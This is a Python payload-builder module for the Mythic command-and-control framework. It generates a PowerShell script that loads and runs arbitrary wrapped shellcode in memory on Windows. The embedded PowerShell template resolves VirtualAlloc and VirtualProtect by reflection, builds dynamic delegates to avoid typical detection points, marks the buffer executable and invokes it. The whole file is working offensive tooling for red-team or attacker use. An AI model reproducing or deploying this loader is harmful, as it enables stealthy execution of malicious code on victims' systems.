import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import string
import os
import shutil
import base64
import random

class psh_wraps_shellcode(PayloadType):
    name = "psh_wraps_shellcode"
    file_extension = "ps1"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["shellcode"]
    note = """Executes a shellcode in the powershell context"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "powershell"
    agent_icon_path = agent_path / "agent_functions" / "powershell.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            shellcode = self.wrapped_payload
            ps_shellcode = ""
            while(len(shellcode) > 0):
                part = [hex(b) for b in shellcode[0:16]]
                shellcode = shellcode[16:]

                ps_shellcode += ",".join(part)
                if len(shellcode) != 0:
                    ps_shellcode += ",\n"
                else:
                    ps_shellcode += ""


            payload = """
Function GetFunctionAddress {
    param(
        [string]$ModuleName,
        [string]$MethodName
    )
 
    $system = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object Location -like '*System.dll'
    $unsafe = $system.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $GetModuleHandle = $unsafe.GetMethod('GetModuleHandle').Invoke($null, @($ModuleName))
    $GetProcAddress = $unsafe.GetMethods() | Where-Object { ${_}.Name -eq 'GetProcAddress' } | Select-Object -First 1
    $FunctionAddress = $GetProcAddress.Invoke($null, @($GetModuleHandle, "$MethodName"))
 
    return $FunctionAddress
}
 
 
Function ExecuteFunction {
 
    param(
        [IntPtr]$FunctionAddress,
        $Signature = [void],
        $Arguments = [void]
    )
 
    $MyAssembly = New-Object ([type]::GetType("System.Reflection.AssemblyName")) 'BordergateDelegate' 
    $Domain = [AppDomain]::CurrentDomain
    $enumType = [Type]::GetType("System.Reflection.Emit.AssemblyBuilderAccess")
    $access = [Enum]::Parse($enumType, 'Run')
    $MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, $access)
    $MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Signature)
    $MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',[IntPtr], $Signature)
    $MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
    $MyDelegateType = $MyTypeBuilder.CreateType()
    $TargetFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $MyDelegateType)
    return $TargetFunction
}

[Byte[]] $buf = [Byte[]](%s)

$FunctionAddress = GetFunctionAddress -ModuleName "kernel32.dll" -MethodName "VirtualAlloc"
$VirtualAlloc = ExecuteFunction -FunctionAddress $FunctionAddress -Signature ([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$TargetBuffer = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x4)

$marshal = [type]::GetType("System.Runtime.InteropServices.Marshal")
$method = $marshal.GetMethod("Copy", [Reflection.BindingFlags] "Public,Static", $null, @(
    [byte[]], [int], [IntPtr], [int]
), $null)
$method.Invoke($null, @($buf, 0, $TargetBuffer, $buf.Length))

$FunctionAddress = GetFunctionAddress -ModuleName "kernel32.dll" -MethodName "VirtualProtect"
$VirtualProtect = ExecuteFunction -FunctionAddress $FunctionAddress -Signature ([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
[Uint32]$old = 0
$VirtualProtect.Invoke($TargetBuffer, $buf.Length, 0x20, [ref]$old)


$Run = ExecuteFunction -FunctionAddress $TargetBuffer -Signature @()
$Run.Invoke()
""" % ps_shellcode

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

